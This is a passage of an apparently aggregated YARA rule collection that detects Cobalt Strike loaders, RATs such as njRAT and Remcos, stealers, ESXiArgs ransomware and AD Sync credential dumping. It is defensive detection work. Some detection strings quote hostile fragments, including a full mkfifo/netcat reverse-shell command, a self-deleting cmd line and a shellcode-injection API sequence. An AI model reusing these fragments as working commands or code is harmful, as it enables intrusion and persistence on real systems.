		all of them and @vars [ 1 ] < @res [ 1 ] and @allocstuff [ 1 ] < @rwxpage [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Template_Py_V3_3_To_V4_X_1
{
	meta:
		description = "Cobalt Strike's resources/template.py signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "16aef9a9-b217-5462-93dc-f6273c99ddd0"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Py_v3_3_to_v4_x.yara#L17-L36"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "d5cb406bee013f51d876da44378c0a89b7b3b800d018527334ea0c5793ea4006"
		logic_hash = "3c26cea4b8f2b200bf58e939ae9ead7a7339d4ec0de8c72b3d9c7da897600081"
		score = 75
		quality = 85
		tags = ""

	strings:
		$arch = "platform.architecture()"
		$nope = "WindowsPE"
		$alloc = "ctypes.windll.kernel32.VirtualAlloc"
		$movemem = "ctypes.windll.kernel32.RtlMoveMemory"
		$thread = "ctypes.windll.kernel32.CreateThread"
		$wait = "ctypes.windll.kernel32.WaitForSingleObject"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template__X32_X64_Ps1_V1_45_To_V2_5_And_V3_11_To_V3_14_1
{
	meta:
		description = "Cobalt Strike's resources/template.x64.ps1, resources/template.x32 from v3.11 to v3.14 and resources/template.ps1 from v1.45 to v2.5 "
		author = "gssincla@google.com"
		id = "c9fa6a39-0098-5dde-9762-94bc6b2df299"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template__x32_x64_Ps1_v1_45_to_v2_5_and_v3_11_to_v3_14.yara#L17-L43"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ff743027a6bcc0fee02107236c1f5c96362eeb91f3a5a2e520a85294741ded87"
		logic_hash = "5196f111f257239d2e7e4ca342e7fc8bac1687743bc8c7ff23addf1f094b2e93"
		score = 75
		quality = 85
		tags = ""

	strings:
		$importVA = "[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc" nocase
		$importCT = "[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread" nocase
		$importWFSO = "[DllImport(\"kernel32.dll\")] public static extern int WaitForSingleObject" nocase
		$compiler = "New-Object Microsoft.CSharp.CSharpCodeProvider" nocase
		$params = "New-Object System.CodeDom.Compiler.CompilerParameters" nocase
		$paramsSys32 = ".ReferencedAssemblies.AddRange(@(\"System.dll\", [PsObject].Assembly.Location))" nocase
		$paramsGIM = ".GenerateInMemory = $True" nocase
		$result = "$compiler.CompileAssemblyFromSource($params, $assembly)" nocase

	condition:
		all of them
}

rule JPCERTCC_Himawari_1
{
	meta:
		description = "detect Himawari(a variant of RedLeaves) in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "85c33dc6-0f9b-5645-b236-f416df16b4a4"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://www.jpcert.or.jp/present/2018/JSAC2018_01_nakatsuru.pdf"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L68-L82"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "9014e6e02fb9d8fa0f646c61647ab28c3cb08f10f8f584ddd11eba27211307f5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "3938436ab73dcd10c495354546265d5498013a6d17d9c4f842507be26ea8fafb"

	strings:
		$h1 = "himawariA"
		$h2 = "himawariB"
		$h3 = "HimawariDemo"

	condition:
		all of them
}

rule JPCERTCC_Hawkeye_1
{
	meta:
		description = "detect HawkEye in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "fc988aaf-bdac-5a53-a90c-d35d86285cd6"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L259-L272"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "45256e1e56de3934d2e57a7c036d49a0f56c25538ed7ad3eb7ee8efa7f549e98"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$hawkstr1 = "HawkEye Keylogger" wide
		$hawkstr2 = "Dear HawkEye Customers!" wide
		$hawkstr3 = "HawkEye Logger Details:" wide

	condition:
		all of them
}

rule JPCERTCC_Xxmm_1
{
	meta:
		description = "detect xxmm in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "be459cbf-84a1-539e-b0b5-b7a00b6d278d"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L306-L319"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "4a860ac3efb97ce03fa906c2d0e7cd08654f6e82531d9449af7891be83a036d5"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "setupParameter:"
		$v2 = "loaderParameter:"
		$v3 = "parameter:"

	condition:
		all of them
}

rule JPCERTCC_Netwire_1
{
	meta:
		description = "detect netwire in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "cf71b80f-2618-5209-bb49-fefea9e0a7f3"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L351-L367"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "fa6ec967b6b3de226dcdb06d6b8f684800331a2420f038dd6274a8b9c3d8be78"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "HostId-%Rand%"
		$v2 = "mozsqlite3"
		$v3 = "[Scroll Lock]"
		$v4 = "GetRawInputData"
		$ping = "ping 192.0.2.2"
		$log = "[Log Started] - [%.2d/%.2d/%d %.2d:%.2d:%.2d]"

	condition:
		($v1 ) or ( $v2 and $v3 and $v4 ) or ( $ping and $log )
}

rule JPCERTCC_Nanocore_1
{
	meta:
		description = "detect Nanocore in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "0b12ad94-99c2-5d48-a860-ff75b82971af"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L369-L382"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "471dcda6f5fb9c30e3a1df7171fdba889114d54166d038d18c7910e2765d5250"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$v1 = "NanoCore Client"
		$v2 = "PluginCommand"
		$v3 = "CommandType"

	condition:
		all of them
}

rule JPCERTCC_Agenttesla_Type1_1
{
	meta:
		description = "detect Agenttesla in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "92bfb3ab-d8d0-50ec-8ab8-ad34f1edb906"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "internal research"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L399-L411"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "24b9b815400967a9086048527f7aa1fce08bcd94a16aec8080aeac97045b297a"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$iestr = "C:\\\\Users\\\\Admin\\\\Desktop\\\\IELibrary\\\\IELibrary\\\\obj\\\\Debug\\\\IELibrary.pdb"
		$atstr = "C:\\\\Users\\\\Admin\\\\Desktop\\\\ConsoleApp1\\\\ConsoleApp1\\\\obj\\\\Debug\\\\ConsoleApp1.pdb"
		$sqlitestr = "Not a valid SQLite 3 Database File" wide

	condition:
		all of them
}

rule JPCERTCC_Noderat_1
{
	meta:
		description = "detect Noderat in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "9c2c4b0f-0f45-54f6-a98c-b592af882eef"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://blogs.jpcert.or.jp/ja/2019/02/tick-activity.html"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L429-L442"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "e1254b6cf28161943db202ea0a6ff2d86aa7975d4a3ecc0f26eed58101e54960"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"

	strings:
		$config = "/config/app.json"
		$key = "/config/.regeditKey.rc"
		$message = "uninstall error when readFileSync: "

	condition:
		all of them
}

rule JPCERTCC_Njrat_1
{
	meta:
		description = "detect njRAT in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "96b35796-3e1d-5721-998a-e678612e4de7"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L444-L456"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "398614ff5ea37dfaf6c36f60702cb7cdfe66b4569c698e9c3ea29563e4031856"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "d5f63213ce11798879520b0e9b0d1b68d55f7727758ec8c120e370699a41379d"

	strings:
		$reg = "SEE_MASK_NOZONECHECKS" wide fullword
		$msg = "Execute ERROR" wide fullword
		$ping = "cmd.exe /c ping 0 -n 2 & del" wide fullword

	condition:
		all of them
}

rule JPCERTCC_Remcos_1_1
{
	meta:
		description = "detect Remcos in memory"
		author = "JPCERT/CC Incident Response Group"
		id = "4a27a16a-2669-5009-bc82-082ec0c9b2c1"
		date = "2021-08-16"
		modified = "2021-08-16"
		reference = "https://github.com/JPCERTCC/MalConfScan/"
		source_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/yara/rule.yara#L480-L493"
		license_url = "https://github.com/JPCERTCC/MalConfScan//blob/19ec0d145535a6a4cfd37c0960114f455a8c343e/LICENSE.txt"
		logic_hash = "1b4b9f7a88f33faeda71ea9a354eeccba8889800f48a6280c4ec533bb1b3ef3d"
		score = 75
		quality = 80
		tags = ""
		rule_usage = "memory scan"
		hash1 = "7d5efb7e8b8947e5fe1fa12843a2faa0ebdfd7137582e5925a0b9c6a9350b0a5"

	strings:
		$remcos = "Remcos" ascii fullword
		$url1 = "Breaking-Security.Net" ascii fullword
		$url2 = "BreakingSecurity.Net" ascii fullword
		$resource = "SETTINGS" ascii wide fullword

	condition:
		1 of ( $url* ) and $remcos and $resource
}

rule SECUINFRA_OBFUS_Javascript_Wscript_Hex_Strings_Usage_1
{
	meta:
		description = "Detects the frequent usage of Wscript to get an hex encoded string from an array and interpret it. Used by e.g WSHRAT"
		author = "SECUINFRA Falcon Team"
		id = "dd55753e-4f7b-56be-a6d4-66f1d7dc8747"
		date = "2022-12-02"
		modified = "2022-02-13"
		reference = "https://github.com/SIFalcon/Detection"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Obfuscation/javascript_obfuscation.yar#L2-L19"
		license_url = "N/A"
		logic_hash = "62bc3261b3c2e902a82423239a7ee0bcedfccbeeeda11833b935197144dc7c35"
		score = 75
		quality = 70
		tags = ""

	strings:
		$wscript = "= WScript["
		$hex_enc_str1 = "\\x63\\x72\\x65\\x61"
		$hex_enc_str2 = "\\x73\\x63\\x72\\x69"
		$hex_enc_str3 = "\\x71\\x75\\x69\\x74"
		$hex_enc_str4 = "\\x41\\x72\\x67\\x75"

	condition:
		#wscript> 30 and 2 of ( $hex_enc_str* )
}

rule SECUINFRA_RANSOM_Esxiargs_Ransomware_Python_Feb23_1
{
	meta:
		description = "Detects the ESXiArgs Ransomware encryption bash script"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "6e2d6695-b727-5b71-bfa0-e8290e057c36"
		date = "2023-02-07"
		modified = "2023-02-07"
		reference = "https://secuinfra.com/en/techtalk/hide-your-hypervisor-analysis-of-esxiargs-ransomware"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/RANSOM_ESXiArgs_Ransomware_Python_Feb23.yar#L1-L31"
		license_url = "N/A"
		logic_hash = "b821d1829ab4fb5eea896156a303198d6531d734196f0f947aef5d46754e6ccb"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$python = "#!/bin/python"
		$desc = "This module starts debug tools"
		$command0 = "server_namespace"
		$command1 = "service_instance"
		$command2 = "local"
		$command3 = "operation_id"
		$command4 = "envelope"
		$cmd = "'mkfifo /tmp/tmpy_8th_nb; cat /tmp/tmpy_8th_nb | /bin/sh -i 2>&1 | nc %s %s > /tmp/tmpy_8th_nb' % (host, port)"
		$OpenSLPPort = "port = '427'"
		$listener = "HTTPServer(('127.0.0.1', 8008), PostServer).serve_forever()"

	condition:
		$python and $desc and 4 of ( $command* ) and $cmd and $OpenSLPPort and $listener
}

rule SECUINFRA_MALWARE_Plugx_USB_Delivery_Ini_Icon_Jun23_1
{
	meta:
		description = "Detects PlugX-style Malware delivery via removable Drives (USB) - Desktop.ini Icon File; could potentially yield FPs"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "faaa507f-8478-5412-be86-4cae7fe28d21"
		date = "2023-06-21"
		modified = "2023-06-21"
		reference = "https://unit42.paloaltonetworks.com/plugx-variants-in-usbs/"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Malware/MALWARE_PlugX_USB_Delivery_Jun21.yar#L33-L49"
		license_url = "N/A"
		logic_hash = "1cf552c4627073d13832cf0ac602a610e0919af9e9a197aa07fef5d6a414644b"
		score = 75
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$s_shellclassinfo = "[.ShellClassInfo]" ascii
		$s_IconRes = "IconResource=C:\\Windows\\system32\\SHELL32.dll,7" ascii

	condition:
		all of ( $s_* )
}

rule SECUINFRA_SUS_Unsigned_APPX_MSIX_Manifest_Feb23_1
{
	meta:
		description = "Detects suspicious Microsoft Windows APPX/MSIX Installer Manifests"
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		id = "f24f7e03-3cc5-5214-b6d2-205b69898636"
		date = "2023-02-01"
		modified = "2023-02-07"
		reference = "https://twitter.com/SI_FalconTeam/status/1620500572481945600"
		source_url = "https://github.com/SIFalcon/Detection/blob/2d7c66d7d16c7541bf2a9a83a7a6d334364a26fd/Yara/Filetypes/SUS_Unsigned_APPX_MSIX_Manifest_Feb23.yar#L1-L25"
		license_url = "N/A"
		logic_hash = "4e3de25fdad9d76cefbb191424a739368b521c4f234656c397f4122debe749fa"
		score = 65
		quality = 70
		tags = ""
		tlp = "CLEAR"

	strings:
		$xlmns = "http://schemas.microsoft.com/appx/manifest/"
		$identity = "OID.2.25.311729368913984317654407730594956997722=1"
		$s_entrypoint = "EntryPoint=\"Windows.FullTrustApplication\""
		$s_capability = "runFullTrust"
		$s_peExt = ".exe"

	condition:
		uint32be( 0x0 ) == 0x3C3F786D and $xlmns and $identity and 2 of ( $s* )
}

rule RUSSIANPANDA_Darkgate_Autoit_1
{
	meta:
		description = "Detects DarkGate AutoIT script"
		author = "RussianPanda"
		id = "b30544b5-88c9-5a84-8582-f4f72b228f24"
		date = "2024-01-26"
		modified = "2024-01-26"
		reference = "https://yara.readthedocs.io/en/stable/writingrules.html?highlight=xor"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/DarkGate/darkgate_autoit.yar#L1-L19"
		license_url = "N/A"
		hash = "e1803b01e3f187355dbeb87a0c91b76c"
		logic_hash = "dda6726d09035d6f61ca331d18ed37f032c6f6a5ab88e1754a21587f4c79ac87"
		score = 75
		quality = 85
		tags = ""

	strings:
		$h = "AU3!EA06"
		$s1 = "just_test.txt" xor(0x01-0xff)
		$s2 = "c:\\temp\\data.txt" xor(0x01-0xff)
		$s3 = "test.txt" xor(0x01-0xff)
		$s4 = "cc.txt" xor(0x01-0xff)
		$s5 = "c:\\temp\\data.txt" xor(0x01-0xff)
		$s6 = "uu.txt" xor(0x01-0xff)

	condition:
		3 of ( $s* ) and $h
}

rule RUSSIANPANDA_Sentinel_Stealer_1
{
	meta:
		description = "Detects Sentinel Stealer"
		author = "RussianPanda"
		id = "8a221d7b-8fa6-53cd-a3e8-63cc67285186"
		date = "2024-01-19"
		modified = "2024-01-19"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/SentinelStealer/sentinel_stealer.yar#L1-L14"
		license_url = "N/A"
		hash = "3a540a8a81c5a5b452f154d7875423a3"
		logic_hash = "b9d72848842ea4d26544633bb83fccd17239b28493bde3f73341eb2004d8ee0c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Sentinel.SmallerEncryptedIcon" wide
		$s2 = "SentinelSteals" wide
		$s4 = "_CorExeMain"

	condition:
		all of them
}

rule RUSSIANPANDA_Fakebat_Powershell_1
{
	meta:
		description = "Detects FakeBat PowerShell scripts"
		author = "RussianPanda"
		id = "76149a6f-c370-5e48-82cc-c89b545c0aa8"
		date = "2023-12-01"
		modified = "2023-12-01"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/FakeBat/fakebat_powershell.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "df6b30d97ac6c9b248fed0d901e8a0a6ad1d855483a5006b008b839d9961092a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$LoadDomen/?status=start&av=" nocase
		$s2 = "$xxx.gpg" nocase

	condition:
		all of ( $s* )
}

rule RUSSIANPANDA_Win_Mal_Koistealer_PS_1
{
	meta:
		description = "Detects KoiStealer PowerShell script"
		author = "RussianPanda"
		id = "6dfdb39c-1b6a-5969-9c2d-e09869af6e0f"
		date = "2024-04-04"
		modified = "2024-04-04"
		reference = "https://github.com/RussianPanda95/Yara-Rules"
		source_url = "https://github.com/RussianPanda95/Yara-Rules/blob/1ce9c0dec191b43d51ceb34234a12e63970b252c/Koi/win_mal_KoiStealer_PS.yar#L1-L12"
		license_url = "N/A"
		hash = "4f55be0b55ec67dfda42b88e9c743a2a"
		logic_hash = "8a60a1d770eb4b5048762ddfd4657fdf7a430b09eb454ae5a5bb3103460907db"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "index.php?id=$guid&subid="
		$s2 = "$config"

	condition:
		all of ( $s* )
}

rule EMBEERESEARCH_Win_Orcus_Rat_Simple_Strings_Dec_2023_1
{
	meta:
		description = "Strings observed in Orcus RAT"
		author = "Matthew @ Embee_Research"
		id = "baef6b96-bf94-5363-9186-9761a8055afd"
		date = "2023-12-24"
		modified = "2023-12-24"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_orcus_rat_simple_strings_dec_2023.yar#L1-L26"
		license_url = "N/A"
		hash = "30a2a674d55d7898d304713dd2f69a043d875230ea7ebee22596ba4c640768db"
		logic_hash = "2e0a44ec2749e0fc646dfb003a2d32b3fecfa07ece72ca5a65116250d80496b8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "Orcus is a Remote Administration Tool for Windows. It allows the administrator to make changes to the system remotely." wide
		$s2 = "Orcus.Service" wide
		$s4 = "costura.orcus" wide
		$s5 = "Orcus.Commands"
		$s6 = "Orcus.Shared"
		$s7 = "Orcus.Utilities"
		$s8 = "Orcus.StaticCommands"
		$s9 = "Orcus.Plugins"

	condition:
		(5 of them )
}

rule EMBEERESEARCH_Win_Berbew_Strings_Dec_2023_1
{
	meta:
		description = "Strings observed in Berbew malware."
		author = "Matthew @ Embee_Research"
		id = "402711af-c543-5c95-ae9e-e663825b6653"
		date = "2023-12-24"
		modified = "2023-12-26"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_berbew_strings_dec_2023.yar#L1-L19"
		license_url = "N/A"
		hash = "24dc0af3c51118697df999d8bffcdfc9cbf0d07f2630473450dd826a1ae4b9ae"
		logic_hash = "a7f687e749ec69961777063d52678461a8e288c80037fac051d7b1a5b568d9e8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "This KEWL STUFF was coded by V. V. PUPKIN"
		$s2 = "REAL CASH, REAL BITCHEZ"
		$s3 = "Please, enter your Card Number"

	condition:
		all of them
}

rule SBOUSSEADEN_Webcreds_Regexp_B64_1
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "85283a81-5bc3-5e3f-89f6-bcc1f40f3dc2"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://github.com/orlyjamie/mimikittenz/blob/master/Invoke-mimikittenz.ps1"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L24-L43"
		license_url = "N/A"
		logic_hash = "432c812177a50c50d08feb88a1293ecb625b9b0aa6a839789da150255bc83228"
		score = 75
		quality = 75
		tags = ""

	strings:
		$p1 = "&password=" base64
		$p2 = "&login_password=" base64
		$p3 = "&pass=" base64
		$p4 = "&Passwd=" base64
		$p5 = "&PersistentCookie=" base64
		$p6 = "password%5D=" base64
		$u1 = "&username=" base64
		$u2 = "&email=" base64
		$u3 = "login=" base64
		$u4 = "login_email=" base64
		$u5 = "user%5Bemail%5D=" base64
		$reg = ".{1,"

	condition:
		3 of ( $p* ) and 3 of ( $u* ) and #reg > 3
}

rule SBOUSSEADEN_Adsync_Creddump_Wide_1
{
	meta:
		description = "AD Connect Sync Credential Extract"
		author = "SBousseaden"
		id = "ccbfa79a-924b-512a-a9e9-005567b4fe83"
		date = "2020-04-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L45-L67"
		license_url = "N/A"
		logic_hash = "e8b0ff1fa9117a98799239d37c5a0ae8be25c2c2519c4fc2a1d7f085a9ebe2e1"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "private_configuration_xml" wide xor
		$s2 = "LoadKeySet" xor
		$s3 = "encrypted_configuration" wide xor
		$s4 = "GetActiveCredentialKey" xor
		$s5 = "DecryptBase64ToString" xor
		$s6 = "KeyManager" xor
		$s7 = "(LocalDB)\\.\\ADSync" wide xor
		$s8 = "mms_management_agent" wide xor
		$s9 = "keyset_id" wide xor
		$s10 = "xp_cmdshell" xor
		$s11 = "System.Data.SqlClient"
		$s12 = "Password" wide xor
		$fp1 = "mmsutils\\mmsutils.pdb"

	condition:
		5 of them and not $fp1
}

rule SBOUSSEADEN_Adsync_Creddump_Xor_1
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "e0d951ec-ec39-5f37-b5a8-ddd0b1dc588d"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L69-L89"
		license_url = "N/A"
		logic_hash = "831ed0410000ad9dfa7be2ab1f64a4130810465cf699bb3e45c93075db6fdb74"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" xor
		$a2 = "LoadKeySet" xor
		$a3 = "encrypted_configuration" xor
		$a4 = "GetActiveCredentialKey" xor
		$a5 = "DecryptBase64ToString" xor
		$a6 = "Cryptography.KeyManager" xor
		$b1 = "mms_management_agent" xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" xor
		$b3 = "xp_cmdshell" xor
		$b4 = "Password" xor
		$b5 = "forest-login-user" xor
		$b6 = "forest-login-domain" xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Adsync_Creddump_V64_1
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "9f536ff2-95b6-5f93-8c6f-e3738d6404c7"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L91-L111"
		license_url = "N/A"
		logic_hash = "e2465fec6dd9384d5d7f31f1c0e7661f4fbd5e3f87a14abfcb9b0412985cb1d6"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" base64
		$a2 = "LoadKeySet" base64
		$a3 = "encrypted_configuration" base64
		$a4 = "GetActiveCredentialKey" base64
		$a5 = "DecryptBase64ToString" base64
		$a6 = "Cryptography.KeyManager" base64
		$b1 = "mms_management_agent" base64
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" base64
		$b3 = "xp_cmdshell" base64
		$b4 = "Password" base64
		$b5 = "forest-login-user" base64
		$b6 = "forest-login-domain" base64

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Adsync_Creddump_Xwide_1
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "a8c3e60a-99b8-50c8-992c-fbe18499a615"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L112-L132"
		license_url = "N/A"
		logic_hash = "9015005494cb3cc52645a9c82f6179992942243a816b05273bc26f58ac70a2e0"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" wide xor
		$a2 = "LoadKeySet" wide xor
		$a3 = "encrypted_configuration" wide xor
		$a4 = "GetActiveCredentialKey" wide xor
		$a5 = "DecryptBase64ToString" wide xor
		$a6 = "Cryptography.KeyManager" wide xor
		$b1 = "mms_management_agent" wide xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" wide xor
		$b3 = "xp_cmdshell" wide xor
		$b4 = "Password" wide xor
		$b5 = "forest-login-user" wide xor
		$b6 = "forest-login-domain" wide xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule ELCEEF_HTML_Windows_Search_Abuse_1
{
	meta:
		description = "Detects HTML files abusing Windows system functionalities to redirect and download malicious payloads"
		author = "marcin@ulikowski.pl"
		id = "537cb46e-4cfc-517c-8d6d-0019f2c3e5ef"
		date = "2024-06-15"
		modified = "2024-06-16"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/HTML_Windows_Search.yara#L1-L22"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "6a0d490cf08ab0aad3c535645abe9ebc26d12768cf2a2e932cdb7ec93cf3e2bd"
		score = 75
		quality = 73
		tags = ""
		hash1 = "d136dcfc355885c502ff2c3be229791538541b748b6c07df3ced95f9a7eb2f30"

	strings:
		$location1 = "location.href" wide ascii
		$location2 = "location.replace(" wide ascii
		$location3 = "location.assign(" wide ascii
		$metarefresh = "<meta http-equiv=\"refresh\"" nocase wide ascii
		$search1 = "\"search-ms:query=" wide ascii
		$search2 = "\"search:query=" wide ascii
		$search3 = "URL=search:query=" wide ascii
		$crumb1 = "&crumb=location:" wide ascii
		$crumb2 = "&amp;crumb=location:" wide ascii

	condition:
		( any of ( $location* ) or $metarefresh ) and any of ( $search* ) and any of ( $crumb* )
}

rule ELCEEF_Base64_SVG_Javascript_1
{
	meta:
